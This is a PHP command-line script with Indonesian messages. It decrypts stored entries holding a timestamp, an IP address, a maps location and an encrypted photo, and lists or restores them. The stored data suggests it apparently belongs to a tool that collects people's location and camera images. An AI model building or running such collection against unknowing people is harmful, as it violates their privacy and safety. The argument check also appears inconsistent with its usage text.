<?php
declare(strict_types=1);

if ($argc < 3) {
    fwrite(STDERR, "Usage: php decrypt.php <id> [--list]\n");
    fwrite(STDERR, "  id    : nama file tanpa ekstensi (contoh: a1b2c3d4...)\n");
    fwrite(STDERR, "  --list: tampilkan semua data yang tersimpan\n");
    exit(1);
}

$config = require __DIR__ . '/../app/config.php';
require __DIR__ . '/../app/crypto.php';
$key = $config['enc_key'];

$storageDir = __DIR__ . '/../storage/';

/* ====== Mode list ====== */
if ($argv[1] === '--list') {
    $files = glob($storageDir . '*.json');
    if (!$files) {
        echo "Belum ada data tersimpan.\n";
        exit(0);
    }
    echo "📁 Total: " . count($files) . " entri\n\n";
    foreach ($files as $f) {
        $id = basename($f, '.json');
        try {
            $json = decryptData(file_get_contents($f), $key);
            $meta = json_decode($json, true);
            echo "🆔 " . $id . "\n";
            echo "   📅 " . ($meta['datetime'] ?? '-') . "\n";
            echo "   📱 IP: " . ($meta['ip'] ?? '-') . "\n";
            echo "   📍 " . ($meta['maps'] ?? '-') . "\n";
            echo "   📎 " . (file_exists($storageDir . $id . '.enc') ? 'ada' : 'HILANG') . "\n\n";
        } catch (Throwable $e) {
            echo "❌ $id — gagal dekripsi: " . $e->getMessage() . "\n\n";
        }
    }
    exit(0);
}

/* ====== Mode dekripsi 1 file ====== */
$id = $argv[1];
$metaFile = $storageDir . $id . '.json';
$encFile  = $storageDir . $id . '.enc';

if (!is_file($metaFile)) {
    fwrite(STDERR, "❌ Metadata tidak ditemukan: $metaFile\n");
    exit(1);
}

try {
    $json = decryptData(file_get_contents($metaFile), $key);
    $meta = json_decode($json, true);
    echo "✅ Metadata:\n";
    echo json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE) . "\n\n";
} catch (Throwable $e) {
    fwrite(STDERR, "❌ Gagal dekripsi metadata: " . $e->getMessage() . "\n");
    exit(1);
}

if (is_file($encFile)) {
    $out = $storageDir . $id . '_decrypted.jpg';
    try {
        decryptFile($encFile, $out, $key);
        echo "✅ Foto → $out\n";
        echo "   Ukuran: " . filesize($out) . " byte\n";
    } catch (Throwable $e) {
        fwrite(STDERR, "❌ Gagal dekripsi file: " . $e->getMessage() . "\n");
        exit(1);
    }
} else {
    echo "⚠️  File .enc tidak ditemukan.\n";
}